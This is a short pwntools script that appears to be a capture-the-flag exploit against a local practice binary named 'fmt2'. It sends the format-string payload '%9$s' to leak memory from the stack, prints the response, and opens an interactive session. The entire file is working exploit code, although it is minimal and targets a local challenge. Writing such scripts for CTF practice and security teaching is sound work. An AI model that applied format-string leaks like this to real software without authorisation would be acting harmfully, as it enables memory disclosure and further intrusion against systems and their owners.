from pwn import *

context.log_level = 'debug'


sh = process('./fmt2')
payload = "%9$s"
print(payload)
#gdb.attach(sh)
sh.sendline(payload)
print(sh.recv())
sh.interactive()
